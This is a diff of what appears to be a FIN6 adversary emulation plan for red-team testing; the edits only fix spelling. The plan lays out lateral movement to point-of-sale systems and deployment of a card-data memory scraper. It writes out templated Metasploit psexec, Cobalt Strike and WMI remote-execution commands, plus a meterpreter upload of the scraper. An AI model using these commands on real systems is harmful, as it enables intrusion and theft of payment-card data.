@@ -1,12 +1,12 @@
 # Phase 2 Overview
 
-During Discovery, FIN6 identifies systems of interest.  Depending on your organization’s use case, this could be a Point of Sale (PoS) system, an E-commerce site, or hosts on which to emulate a ransomware event.  FIN6 has deployed PoS malware via popular penetration testing frameworks and executed these tools with the Windows Management Instrumentation (WMI) Command-Line Utility.  FIN6 is reported to have compromised E-commerce environments by both injecting Magecart scripts into third-party JavaScript libraries and by directly attacking web servers.  To deploy ransomware, the group copies its tools to an internal server, uses bat files for deployment, and WMI or PsExec for execution.
+During Discovery, FIN6 identifies systems of interest.  Depending on your organization’s use case, this could be a Point of Sale (POS) system, an E-commerce site, or hosts on which to emulate a ransomware event.  FIN6 has deployed PoS malware via popular penetration testing frameworks and executed these tools with the Windows Management Instrumentation (WMI) Command-Line Utility.  FIN6 is reported to have compromised E-commerce environments by both injecting Magecart scripts into third-party JavaScript libraries and by directly attacking web servers.  To deploy ransomware, the group copies its tools to an internal server, uses bat files for deployment, and WMI or PsExec for execution.
 
 ## Prerequisites
 
 * You have accomplished the enabling objectives of Phase 1 (compromise, discover, and escalate), have identified your organizations use case (POS, E-commerce/web, ransomware), and are prepared to pursue Phase 2 objectives.
 * Your objectives for Phase 2 are to deploy, execute, and persist an operational capability on a system of interest identified during Discovery.
-* The operational capability should be deployed with the intent of assessing the liklihood of exfiltrating POS data, harvesting payment information from a web server, or deploying ransomware.
+* The operational capability should be deployed with the intent of assessing the likelihood of exfiltrating POS data, harvesting payment information from a web server, or deploying ransomware.
 
 ## Contents
 
@@ -22,7 +22,7 @@ During Discovery, FIN6 identifies systems of interest.  Depending on your organi
 
 The lateral movement described herein describes lateral movement to systems of interest identified during Discovery. FIN6 has moved laterally using RDP and legitimate but compromised credentials to console into remote targets and access the system's command-line to run a PowerShell one-liner that stages either a Meterpreter payload or CobaltStrike's Beacon.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  The group has also made extensive use of these framework's lateral movement capabilities to expand access using built-in psexec commands.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup>  FIN6 uses lateral movement to establish a point of presence on systems of interest, prepare the environment, and deploy their operational capabilities.  
 
-The operational capability we will be emulating for this scenario is PoS malware.  You are encouraged to use a memory scraper of your choosing.  We have opted to use [mem_scraper](https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1).  This PowerShell script continuously dumps a process's memory and subsequently scrapes it for track data.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into Assistant32.exe.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
+The operational capability we will be emulating for this scenario is POS malware.  You are encouraged to use a memory scraper of your choosing.  We have opted to use [mem_scraper](https://github.com/Shellntel/scripts/blob/master/mem_scraper.ps1).  This PowerShell script continuously dumps a process's memory and subsequently scrapes it for track data.  So as to remain operationally representative (name-wise), we used PS2EXE to compile the script into Assistant32.exe.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup>
 
 Additional file names ([T1036.005](https://attack.mitre.org/techniques/T1036/005)) used by FIN6 include:<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
@@ -38,7 +38,7 @@ Additional service names ([T1036.004](https://attack.mitre.org/techniques/T1036/
 
 ### Procedures
 
-#### 5.1 Lateral movement to PoS system using a Command and Control (C2) Framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> <sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>
+#### 5.1 Lateral movement to POS system using a Command and Control (C2) Framework.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> <sup>[13](https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf)</sup>
 
 ##### Metasploit PsExec - PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))
 
@@ -47,7 +47,7 @@ FIN6 Procedure
 ```sh
 msf> use exploit/windows/smb/psexec
 msf exploit(psexec) > set Target PowerShell
-msf exploit(psexec) > set RHost #{PoS system}
+msf exploit(psexec) > set RHost #{POS system}
 msf exploit(psexec) > set SMBDomain #{Domain}
 msf exploit(psexec) > set SMBPass #{Password}
 msf exploit(psexec) > set SMBUser #{User}
@@ -59,13 +59,13 @@ msf exploit(psexec) > exploit
 FIN6 Procedure
 
 ```sh
-beacon> jump psexec_psh #{PoS system}
+beacon> jump psexec_psh #{POS system}
 ```
 
 ##### CobaltStrike - Remote Exec ([T1047](https://attack.mitre.org/techniques/T1047/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/))
 
 ```sh
-remote-exec wmi #{PoS system}
+remote-exec wmi #{POS system}
 ```
 
 #### 5.2 Deploy POS implant to harvest POS data
@@ -79,7 +79,7 @@ meterpreter>upload #{Assistant32.exe} C:\Windows\temp
 FIN6 Procedure
 
 ```sh
-wmic /node:#{"PoS system"} process call create #{"executable"}
+wmic /node:#{"POS system"} process call create #{"executable"}
 ```
 
 ```sh
@@ -171,7 +171,7 @@ FIN6 Procedure
 ```sh
 msf> use exploit/windows/smb/psexec
 msf exploit(psexec) > set Target PowerShell
-msf exploit(psexec) > set RHost #{PoS system}
+msf exploit(psexec) > set RHost #{POS system}
 msf exploit(psexec) > set SMBDomain #{Domain}
 msf exploit(psexec) > set SMBPass #{Password}
 msf exploit(psexec) > set SMBUser #{User}
